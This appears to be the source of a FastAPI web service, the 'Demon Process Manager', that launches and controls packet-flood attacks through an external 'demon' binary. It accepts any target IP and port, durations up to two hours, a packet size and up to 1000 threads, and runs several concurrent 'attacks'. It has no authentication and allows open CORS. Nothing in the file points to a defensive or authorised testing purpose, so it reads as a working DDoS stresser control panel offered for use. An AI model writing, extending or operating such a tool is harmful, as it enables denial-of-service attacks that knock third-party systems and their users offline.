import os
import stat
import signal
import asyncio
import logging
import ipaddress
import time as time_module
from typing import Dict, Optional
from contextlib import asynccontextmanager

import uvicorn
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field, validator

BINARY_PATH = os.getenv("DEMON_BINARY", "./demon")
API_HOST = os.getenv("API_HOST", "0.0.0.0")
API_PORT = int(os.getenv("API_PORT", "8000"))
MAX_CONCURRENT_ATTACKS = int(os.getenv("MAX_CONCURRENT_ATTACKS", "5"))
LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")

if not os.path.isfile(BINARY_PATH):
    raise FileNotFoundError(f"Binary not found: {BINARY_PATH}")
if not os.access(BINARY_PATH, os.X_OK):
    raise PermissionError(f"Binary not executable: {BINARY_PATH}")

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL),
    format='{"time": "%(asctime)s", "level": "%(levelname)s", "name": "%(name)s", "message": %(message)s}',
    handlers=[logging.StreamHandler(), logging.FileHandler("demon_manager.log")]
)
logger = logging.getLogger("demon-manager")

class ProcessStart(BaseModel):
    ip: str = Field(..., description="Target IP address")
    port: int = Field(..., ge=1, le=65535, description="Target port (1-65535)")
    time: int = Field(..., ge=1, le=7200, description="Duration in seconds (1-7200)")
    size: int = Field(1200, ge=100, le=65500, description="Packet size in bytes (100-65500)")
    threads: int = Field(300, ge=1, le=1000, description="Number of threads (1-1000)")

    @validator('ip')
    def validate_ip(cls, v):
        try:
            ipaddress.ip_address(v)
        except ValueError:
            raise ValueError(f"Invalid IP address: {v}")
        return v

class AttackProcess:
    def __init__(self, attack_id: str, ip: str, port: int, duration: int, size: int, threads: int, process: asyncio.subprocess.Process):
        self.id = attack_id
        self.ip = ip
        self.port = port
        self.duration = duration
        self.size = size
        self.threads = threads
        self.process = process
        self.start_time = time_module.monotonic()
        self.stop_requested = False

    @property
    def elapsed(self) -> int:
        return int(time_module.monotonic() - self.start_time)

    @property
    def remaining(self) -> int:
        return max(0, self.duration - self.elapsed)

    def to_dict(self):
        return {
            "id": self.id,
            "ip": self.ip,
            "port": self.port,
            "duration": self.duration,
            "size": self.size,
            "threads": self.threads,
            "elapsed": self.elapsed,
            "remaining": self.remaining,
            "pid": self.process.pid,
            "running": not self.stop_requested and self.process.returncode is None
        }

class ProcessManager:
    def __init__(self, max_concurrent: int):
        self.attacks: Dict[str, AttackProcess] = {}
        self.max_concurrent = max_concurrent
        self._next_id = 0

    def _generate_id(self) -> str:
        self._next_id += 1
        return f"attack_{self._next_id}"

    async def start(self, ip: str, port: int, duration: int, size: int, threads: int) -> AttackProcess:
        if len(self.attacks) >= self.max_concurrent:
            raise HTTPException(
                status_code=429,
                detail=f"Maximum concurrent attacks reached ({self.max_concurrent})"
            )

        cmd = [BINARY_PATH, ip, str(port), str(duration), str(size), str(threads)]
        logger.info(f"Starting attack: {' '.join(cmd)}")

        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
                start_new_session=True
            )
        except Exception as e:
            logger.error(f"Failed to start subprocess: {e}")
            raise HTTPException(status_code=500, detail=f"Failed to start: {str(e)}")

        try:
            await asyncio.wait_for(process.wait(), timeout=0.5)
            raise HTTPException(
                status_code=400,
                detail=f"Binary exited immediately (code {process.returncode}). Check arguments."
            )
        except asyncio.TimeoutError:
            pass

        attack_id = self._generate_id()
        attack = AttackProcess(
            attack_id=attack_id,
            ip=ip,
            port=port,
            duration=duration,
            size=size,
            threads=threads,
            process=process
        )
        self.attacks[attack_id] = attack
        asyncio.create_task(self._monitor_attack(attack))
        return attack

    async def _monitor_attack(self, attack: AttackProcess):
        try:
            await asyncio.sleep(attack.duration)
            if not attack.stop_requested and attack.process.returncode is None:
                logger.info(f"Attack {attack.id} auto-stopping after {attack.duration}s")
                await self._stop_attack(attack.id, force=False)
        except asyncio.CancelledError:
            pass

        try:
            await attack.process.wait()
            if not attack.stop_requested:
                logger.info(f"Attack {attack.id} terminated unexpectedly (exit code {attack.process.returncode})")
                if attack.id in self.attacks:
                    del self.attacks[attack.id]
        except Exception as e:
            logger.error(f"Error monitoring attack {attack.id}: {e}")

    async def _stop_attack(self, attack_id: str, force: bool = False):
        attack = self.attacks.get(attack_id)
        if not attack:
            return

        attack.stop_requested = True
        if attack.process.returncode is not None:
            del self.attacks[attack_id]
            return

        logger.info(f"Stopping attack {attack_id} (PID {attack.process.pid})")
        try:
            os.killpg(os.getpgid(attack.process.pid), signal.SIGTERM)
            try:
                await asyncio.wait_for(attack.process.wait(), timeout=5)
            except asyncio.TimeoutError:
                logger.warning(f"Force killing attack {attack_id}")
                os.killpg(os.getpgid(attack.process.pid), signal.SIGKILL)
                await attack.process.wait()
        except ProcessLookupError:
            pass
        except Exception as e:
            logger.error(f"Error stopping attack {attack_id}: {e}")
        finally:
            if attack_id in self.attacks:
                del self.attacks[attack_id]

    async def stop(self, attack_id: str = None):
        if attack_id:
            await self._stop_attack(attack_id)
        else:
            for aid in list(self.attacks.keys()):
                await self._stop_attack(aid)

    def get_status(self, attack_id: str = None):
        if attack_id:
            attack = self.attacks.get(attack_id)
            return attack.to_dict() if attack else None
        else:
            return [attack.to_dict() for attack in self.attacks.values()]

    def is_running(self, attack_id: str = None) -> bool:
        if attack_id:
            return attack_id in self.attacks
        return len(self.attacks) > 0

pm = ProcessManager(max_concurrent=MAX_CONCURRENT_ATTACKS)

@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("Demon Process Manager starting...")
    yield
    logger.info("Shutting down – stopping all attacks...")
    await pm.stop()
    logger.info("All attacks terminated.")

app = FastAPI(title="Demon Process Manager", version="3.0.0", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.get("/")
async def root():
    return {
        "service": "Demon Process Manager",
        "version": "3.0.0",
        "binary": BINARY_PATH,
        "max_concurrent": MAX_CONCURRENT_ATTACKS
    }

@app.get("/status")
async def get_status(attack_id: Optional[str] = None):
    if attack_id:
        status = pm.get_status(attack_id)
        if not status:
            raise HTTPException(status_code=404, detail="Attack not found")
        return status
    return {
        "active_attacks": len(pm.attacks),
        "max_concurrent": MAX_CONCURRENT_ATTACKS,
        "attacks": pm.get_status()
    }

@app.post("/start")
async def start_process(data: ProcessStart):
    if len(pm.attacks) >= MAX_CONCURRENT_ATTACKS:
        raise HTTPException(status_code=429, detail=f"Max concurrent attacks ({MAX_CONCURRENT_ATTACKS}) reached")
    attack = await pm.start(data.ip, data.port, data.time, data.size, data.threads)
    return {
        "success": True,
        "attack_id": attack.id,
        "pid": attack.process.pid,
        "target": data.ip,
        "port": data.port,
        "duration": data.time,
        "size": data.size,
        "threads": data.threads
    }

@app.post("/stop")
async def stop_process(attack_id: Optional[str] = None):
    if not pm.is_running(attack_id if attack_id else None):
        if attack_id:
            raise HTTPException(status_code=404, detail=f"Attack {attack_id} not found")
        else:
            raise HTTPException(status_code=404, detail="No active attacks")
    await pm.stop(attack_id)
    return {"success": True, "message": "Stopped attack(s)"}


@app.get("/check")
async def check_system():
    try:
        binary_exists = os.path.isfile(BINARY_PATH)
        binary_executable = False
        binary_perms = None
        
        if binary_exists:
            st = os.stat(BINARY_PATH)
            binary_executable = bool(st.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH))
            binary_perms = oct(st.st_mode)[-3:]
        
        # List files in current directory
        try:
            files = os.listdir(".")
        except:
            files = []
        
        result = {
            "binary_path": BINARY_PATH,
            "binary_exists": binary_exists,
            "binary_executable": binary_executable,
            "binary_permissions": binary_perms,
            "working_directory": os.getcwd(),
            "files_in_cwd": files[:20],  # limit to 20
            "max_concurrent": MAX_CONCURRENT_ATTACKS,
            "active_attacks": len(pm.attacks)
        }
        
        # Optional: try to run binary with --help (non-blocking, short timeout)
        if binary_exists and binary_executable:
            try:
                proc = await asyncio.create_subprocess_exec(
                    BINARY_PATH, "--help",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=2.0)
                result["test_run"] = {
                    "returncode": proc.returncode,
                    "stdout": stdout.decode(errors="replace")[:100],
                    "stderr": stderr.decode(errors="replace")[:100]
                }
            except asyncio.TimeoutError:
                result["test_run"] = {"error": "Timeout (binary hung)"}
            except Exception as e:
                result["test_run"] = {"error": str(e)}
        else:
            result["test_run"] = "Binary missing or not executable"
        
        return result
    except Exception as e:
        # Return error details as JSON instead of crashing
        return {"error": str(e), "type": type(e).__name__}

if __name__ == "__main__":
    uvicorn.run(app, host=API_HOST, port=API_PORT, log_level=LOG_LEVEL.lower())
